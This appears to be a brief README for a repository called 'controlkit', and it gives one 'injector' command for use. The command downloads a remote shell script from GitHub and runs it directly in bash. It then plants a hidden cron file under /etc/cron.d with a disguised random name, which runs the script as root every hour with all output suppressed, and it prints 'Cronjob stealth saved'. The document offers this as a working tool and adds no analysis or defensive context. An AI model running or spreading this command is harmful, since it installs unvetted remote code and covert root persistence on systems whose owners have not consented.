# controlkit

injector 

bash <(curl -s https://raw.githubusercontent.com/Hecate1337-py/controlkit/refs/heads/main/injector_master.sh) && \
RAND=$(head /dev/urandom | tr -dc a-z0-9 | head -c 6) && \
CRONFILE="/etc/cron.d/.sys_$RAND" && \
echo "0 * * * * root bash /root/injector_master.sh > /dev/null 2>&1" > "$CRONFILE" && \
chmod 644 "$CRONFILE" && \
echo "[✓] Cronjob stealth saved as: $CRONFILE"
